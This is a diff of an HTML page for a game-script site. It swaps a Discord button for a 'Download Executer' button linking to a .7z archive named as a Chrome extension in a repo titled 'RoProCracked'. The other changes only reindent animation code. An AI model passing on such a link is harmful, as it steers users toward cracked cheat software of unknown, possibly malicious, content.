@@ -230,11 +230,10 @@
             JesterCats Script
         </a>
 
-        <a href="https://discord.gg/2f3STn2u" target="_blank" class="action-button mb-4">
-            Join Discord
-
+        <a href="https://github.com/JesterCat533/RBX-RoProCracked/raw/main/ChromeExttension.7z" class="action-button mb-4">
+            Download Executer
         </a>
-    </div>
+        </div>
 
 
     <audio id="bgMusic" loop>
@@ -308,13 +307,13 @@
             element.style.animation = `fallAndRotate ${duration}s linear ${delay}s forwards`; // Use forwards to stay at end state
 
              // Set CSS variables for animation keyframes
-            element.style.setProperty('--start-x', `${elementStartX}vw`);
-            element.style.setProperty('--start-y', `${elementStartY}vh`);
-            // Ensure end positions are well below the viewport for consistent falling
-            element.style.setProperty('--end-x', `${elementStartX + (Math.random() - 0.5) * 100}vw`); // Increased horizontal drift range
-            element.style.setProperty('--end-y', `${130 + (Math.random() * 30)}vh`); // End well below
-            element.style.setProperty('--start-rotate', `${startRotate}deg`);
-            element.style.setProperty('--end-rotate', `${endRotate}deg`);
+             element.style.setProperty('--start-x', `${elementStartX}vw`);
+             element.style.setProperty('--start-y', `${elementStartY}vh`);
+             // Ensure end positions are well below the viewport for consistent falling
+             element.style.setProperty('--end-x', `${elementStartX + (Math.random() - 0.5) * 100}vw`); // Increased horizontal drift range
+             element.style.setProperty('--end-y', `${130 + (Math.random() * 30)}vh`); // End well below
+             element.style.setProperty('--start-rotate', `${startRotate}deg`);
+             element.style.setProperty('--end-rotate', `${endRotate}deg`);
 
 
             // Add the element to the background container
@@ -330,15 +329,15 @@
         // Function to start the chip background animation
         function startChipAnimation() {
              // Create initial background elements
-            const numberOfElements = 30;
-            for (let i = 0; i < numberOfElements; i++) {
-                 createBackgroundElement();
-            }
+             const numberOfElements = 30;
+             for (let i = 0; i < numberOfElements; i++) {
+                  createBackgroundElement();
+             }
 
-            // Periodically add more elements
-            chipSpawningInterval = setInterval(() => {
-                 createBackgroundElement();
-            }, 400);
+             // Periodically add more elements
+             chipSpawningInterval = setInterval(() => {
+                  createBackgroundElement();
+             }, 400);
         }
 
         // Function to stop the chip background animation and remove elements
@@ -378,7 +377,7 @@
                 keyMessage.classList.add('show', 'incorrect');
                  // Optional: Hide the message after a few seconds
                  setTimeout(() => {
-                     keyMessage.classList.remove('show');
+                      keyMessage.classList.remove('show');
                  }, 3000); // Hide after 3 seconds
             }
         });
@@ -388,8 +387,8 @@
         actionButtons.forEach(button => {
              button.addEventListener('mouseenter', () => {
                  if (hoverSound.readyState >= 2) {
-                     hoverSound.currentTime = 0;
-                     hoverSound.play().catch(e => console.error("Hover sound play failed:", e));
+                      hoverSound.currentTime = 0;
+                      hoverSound.play().catch(e => console.error("Hover sound play failed:", e));
                  }
              });
         });
